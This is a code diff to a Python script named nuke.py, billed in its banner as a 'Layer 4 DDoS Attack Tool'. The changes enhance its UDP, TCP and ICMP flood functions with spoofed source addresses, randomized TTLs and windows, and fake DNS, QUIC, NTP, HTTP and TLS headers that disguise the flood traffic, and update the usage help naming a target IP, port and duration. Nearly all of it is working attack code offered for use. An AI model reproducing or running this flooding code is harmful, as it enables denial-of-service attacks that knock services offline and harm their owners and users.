@@ -1,3 +1,4 @@
+# --- Developed by: Ian Narito ----
 import socket
 import threading
 import multiprocessing
@@ -24,33 +25,47 @@ def random_port():
 
 def udp_flood(ip, port, duration):
     timeout = time.time() + duration
-    print("[*] Starting enhanced UDP flood...")
+    print("[*] Enhanced UDP flood engaged.")
+    
     while time.time() < timeout:
         try:
             spoofed_ip = random_ip()
             spoofed_port = random_port()
-            payload_size = random.randint(512, 1400)
-            payload = os.urandom(payload_size)
-
-            packet = IP(src=spoofed_ip, dst=ip) / UDP(sport=spoofed_port, dport=port) / payload
+            payload_size = random.randint(600, 1400)
+            headers = [
+                b'\x00\x01\x00\x00\x00\x01',  # Fake DNS
+                b'\x1c\x03\x01' + os.urandom(32),  # QUIC style
+                b'\x17\x00\x03\x2a' + b'\x00' * 4  # NTP
+            ]
+            payload = random.choice(headers) + os.urandom(payload_size)
+            
+            packet = IP(src=spoofed_ip, dst=ip) / UDP(sport=spoofed_port, dport=port) / Raw(load=payload)
             send(packet, verbose=0)
-        except Exception as e:
-            pass
+        except Exception:
+            continue
 
 def tcp_flood(ip, port, duration):
     timeout = time.time() + duration
     flags = ['S', 'A', 'F', 'P', 'R', 'U']
-    print("[*] Starting enhanced TCP flood...")
+    fake_headers = [
+        b"GET / HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
+        b"POST /login HTTP/1.1\r\nHost: evil.com\r\nContent-Length: 32\r\n\r\n" + os.urandom(32),
+        b"\x16\x03\x01" + os.urandom(48)  
+    ]
+    print("[*] Enhanced TCP flood engaged.")
+    
     while time.time() < timeout:
         try:
             spoofed_ip = random_ip()
             sport = random_port()
             flag = random.choice(flags)
-            payload = os.urandom(random.randint(512, 1024))
-            packet = IP(src=spoofed_ip, dst=ip) / TCP(sport=sport, dport=port, flags=flag) / payload
+            payload = random.choice(fake_headers) + os.urandom(random.randint(16, 128))
+            packet = IP(src=spoofed_ip, dst=ip, ttl=random.randint(32, 255)) / \
+                     TCP(sport=sport, dport=port, flags=flag, window=random.randint(1024, 65535)) / \
+                     Raw(load=payload)
             send(packet, verbose=0)
-        except Exception as e:
-            pass
+        except Exception:
+            continue
 
 def syn_flood(ip, port, duration):
     timeout = time.time() + duration
@@ -67,19 +82,24 @@ def syn_flood(ip, port, duration):
         except Exception as e:
             pass
 
-def icmp_flood(ip, duration):  # port ignored
+def icmp_flood(ip, duration):
     timeout = time.time() + duration
-    print("[*] Starting stealth ICMP flood...")
+    print("[*] Stealth ICMP flood with payload spoofing.")
+    
     while time.time() < timeout:
         try:
             spoofed_ip = random_ip()
-            ttl = random.randint(64, 128)
+            ttl = random.randint(32, 128)
             icmp_type = random.choice([0, 3, 5, 8, 11])
             code = random.randint(0, 15)
-            pkt = IP(src=spoofed_ip, dst=ip, ttl=ttl) / ICMP(type=icmp_type, code=code) / os.urandom(random.randint(64, 512))
+            junk = os.urandom(random.randint(64, 256))
+            marker = b"AI-PING" + bytes([random.randint(65, 90)])
+            payload = junk + marker + junk[::-1]
+
+            pkt = IP(src=spoofed_ip, dst=ip, ttl=ttl) / ICMP(type=icmp_type, code=code) / payload
             send(pkt, verbose=0)
-        except Exception as e:
-            pass
+        except Exception:
+            continue
 
 # --- PROXY-BASED ---
 
@@ -198,7 +218,6 @@ def banner():
 ╚══════╝╚═╝    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝
       
   Layer 4 DDoS Attack Tool
-  Developed by: IanNarito
 """ + Style.RESET_ALL)
 
 if __name__ == "__main__":
@@ -209,8 +228,9 @@ if __name__ == "__main__":
 ╔════════════════════════════════════════════════════════════════════╗
 ║         {Fore.YELLOW}⚠  INSUFFICIENT ARGUMENTS — READ CAREFULLY ⚠{Fore.RED}               ║
 ╠════════════════════════════════════════════════════════════════════╣
-║  {Fore.WHITE}Usage  :{Fore.CYAN} python3 nuke.py <mode> <ip> <port> <duration>            {Fore.RED}║
-║  {Fore.WHITE}Example :{Fore.CYAN} python3 nuke.py tcp 1.1.1.1 80 60                       {Fore.RED}║
+║  {Fore.WHITE}Usage  :{Fore.CYAN} python nuke.py <mode> <ip> <port> <duration>             {Fore.RED}║
+║  {Fore.WHITE}Example :{Fore.CYAN} python nuke.py tcp 1.1.1.1 80 60                        {Fore.RED}║
+║  {Fore.WHITE}Developed by  :{Fore.CYAN} IanNarito                                         {Fore.RED}║
 ╠════════════════════════════════════════════════════════════════════╣
 ║  {Fore.WHITE}Available Modes:{Fore.GREEN}                                                  {Fore.RED}║
 ║    ▸ tcp      ▸ udp      ▸ syn      ▸ cps                          {Fore.RED}║
